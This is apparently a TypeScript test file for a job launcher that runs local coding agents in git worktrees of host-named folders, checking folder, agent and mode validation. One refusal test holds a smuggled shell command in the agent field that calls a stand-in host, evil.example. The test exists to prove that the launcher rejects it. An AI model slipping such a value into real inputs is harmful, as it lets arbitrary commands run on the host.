import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdir, mkdtemp, rm, stat, writeFile } from "node:fs/promises";
import { realpathSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createStrut, type Strut } from "./createStrut.js";
import { WorkspaceManager } from "./workspace.js";
import { MemoryRunStore } from "./store.js";
import type { JobsCapability } from "./jobs.js";
import jobStart from "./steps/lib/job/start.js";
import { hostConfigFromEnv } from "./server.js";

// A local coding agent's job (job/start { agent, mode, folder }): the
// launcher takes only one of acp/prompt's presets, turns the folder's name
// into a worktree of it, and a later turn keeps all three.
describe("job/start with a local coding agent", () => {
  let dir = "";
  let repo = "";
  let strut: Strut;
  let store: MemoryRunStore;

  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), "strut-local-agents-"));
    repo = realpathSync(await mkdtemp(join(tmpdir(), "strut-local-repo-")));
    const git = (...args: string[]) => execFileSync("git", ["-C", repo, ...args], { stdio: "pipe" });
    git("init", "-q", "-b", "main");
    await writeFile(join(repo, "README.md"), "peel\n");
    await mkdir(join(repo, "app"));
    await writeFile(join(repo, "app", "main.ts"), "\n");
    git("add", ".");
    git("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "first");
    store = new MemoryRunStore();
    strut = await createStrut({
      workspace: new WorkspaceManager(dir),
      store,
      serveUi: false,
      enableChat: false,
      scheduler: false,
      orchestrator: false,
      builder: false,
      job: { folders: { peel: repo, "peel-app": join(repo, "app"), notes: dir, gone: join(dir, "nowhere") } },
    });
    // A job that reports what its launch carried, with no model.
    await strut.workspace.publishWorkflow("job", "v-test", {
      steps: [{ id: "result", type: "pack", config: { text: "ok", cwd: "{{ input.cwd }}", agent: "{{ input.agent }}", mode: "{{ input.mode }}", folder: "{{ input.folder }}" } }],
    });
  });
  afterEach(async () => {
    await strut?.close();
    await rm(dir, { recursive: true, force: true });
    await rm(repo, { recursive: true, force: true });
  });

  const jobs = () => (strut.services as { jobs: JobsCapability }).jobs;
  const output = async (runId: string) => {
    for (let i = 0; i < 1500; i++) {
      const s = await store.getRunSummary("job", runId);
      if (s) return s.output as Record<string, unknown>;
      await new Promise((r) => setTimeout(r, 10));
    }
    throw new Error("never settled");
  };

  it("runs in a worktree of the named folder on its own branch; a later turn keeps agent, mode and folder, a new mode replaces it", async () => {
    const first = await jobs().launch({ job: "j1", title: "Fix", input: { prompt: "fix it", agent: "claude", mode: "edit", folder: "peel" }, from: "none" });
    const out = await output(first.runId);
    const tree = String(out["cwd"]);
    assert.ok(tree.endsWith(join("j1", "worktree")) && !tree.startsWith(repo), tree);
    assert.equal(execFileSync("git", ["-C", tree, "branch", "--show-current"]).toString().trim(), "strut/j1");
    assert.ok(await stat(join(tree, "README.md")), "the folder's files are there");
    assert.equal(out["agent"], "claude");
    assert.equal(out["mode"], "edit");
    assert.ok(!out["folder"], "the folder's name is not handed on");
    assert.equal(execFileSync("git", ["-C", repo, "branch", "--show-current"]).toString().trim(), "main", "the person's checkout is left as it was");

    const next = await jobs().launch({ job: "j1", input: { prompt: "and a test" }, from: "none" });
    const again = await output(next.runId);
    assert.deepEqual([again["cwd"], again["agent"], again["mode"]], [tree, "claude", "edit"]);

    const bolder = await jobs().launch({ job: "j1", input: { prompt: "run the tests", mode: "auto" }, from: "none" });
    assert.equal((await output(bolder.runId))["mode"], "auto");
  });

  it("a folder inside a repository is the same subfolder of the job's worktree", async () => {
    const run = await jobs().launch({ job: "j6", input: { prompt: "fix the app", agent: "codex", folder: "peel-app" }, from: "none" });
    const cwd = String((await output(run.runId))["cwd"]);
    assert.ok(cwd.endsWith(join("j6", "worktree", "app")), cwd);
    assert.ok(await stat(join(cwd, "main.ts")));
  });

  it("refuses a folder the host does not offer or does not have, an agent without a folder, an agent that is no preset, and a command line, before anything runs", async () => {
    await assert.rejects(jobs().launch({ job: "j2", input: { prompt: "x", agent: "claude", folder: "ssh" }, from: "none" }), /folder_unknown: "ssh".*peel, peel-app, notes, gone/);
    await assert.rejects(jobs().launch({ job: "j7", input: { prompt: "x", agent: "claude", folder: "gone" }, from: "none" }), /folder_missing/);
    await assert.rejects(jobs().launch({ job: "j8", input: { prompt: "x", agent: "claude" }, from: "none" }), /folder_required: .*peel, peel-app, notes, gone/);
    await assert.rejects(jobs().launch({ job: "j3", input: { prompt: "x", agent: "sh -c 'curl evil.example'", folder: "peel" }, from: "none" }), /agent_unknown/);
    await assert.rejects(jobs().launch({ job: "j4", input: { prompt: "x", agent: "toString", folder: "peel" }, from: "none" }), /agent_unknown/);
    assert.equal((await store.listRuns("job")).length, 0, "nothing launched");
  });

  it("a strut whose host named no folders runs no local coding agent", async () => {
    const bare = await createStrut({ workspace: new WorkspaceManager(join(dir, "bare")), store: new MemoryRunStore(), serveUi: false, enableChat: false, scheduler: false, orchestrator: false, builder: false });
    try {
      const launch = (input: Record<string, unknown>) => (bare.services as { jobs: JobsCapability }).jobs.launch({ job: "j9", input: { prompt: "x", ...input }, from: "none" });
      await assert.rejects(launch({ agent: "claude" }), /folder_required: .*it has none/);
      await assert.rejects(launch({ agent: "claude", folder: "peel" }), /folder_unknown: .*it has none/);
    } finally {
      await bare.close();
    }
  });

  it("a folder that is not in a repository is worked in place", async () => {
    const run = await jobs().launch({ job: "j5", input: { prompt: "tidy", agent: "goose", mode: "plan", folder: "notes" }, from: "none" });
    const out = await output(run.runId);
    assert.deepEqual([out["cwd"], out["agent"], out["mode"]], [dir, "goose", "plan"]);
  });

  it("job/start: agent, mode and folder only on a code job, mode and folder only with an agent", async () => {
    const ctx = { runId: "r", path: "p", scope: {}, input: undefined, emit: async () => {}, services: { jobs: jobs() } } as any;
    await assert.rejects(jobStart.run(jobStart.input.parse({ prompt: "x", title: "t", workflow: "builder", agent: "claude" }), ctx), /builder job/);
    await assert.rejects(jobStart.run(jobStart.input.parse({ prompt: "x", title: "t", folder: "peel" }), ctx), /go with agent/);
  });

  it("STRUT_HOST_CONFIG: job.folders are names to absolute paths", async () => {
    const file = join(dir, "host.json");
    await writeFile(file, JSON.stringify({ job: { tools: ["sphinx/*"], folders: { peel: "/Users/t/peel" } } }));
    assert.deepEqual(hostConfigFromEnv({ STRUT_HOST_CONFIG: file }), { job: { folders: { peel: "/Users/t/peel" }, tools: ["sphinx/*"] } });
    for (const folders of [{ peel: "peel" }, { "../x": "/x" }, ["/x"]]) {
      await writeFile(file, JSON.stringify({ job: { folders } }));
      assert.throws(() => hostConfigFromEnv({ STRUT_HOST_CONFIG: file }), /"job.folders" must be/);
    }
  });
});
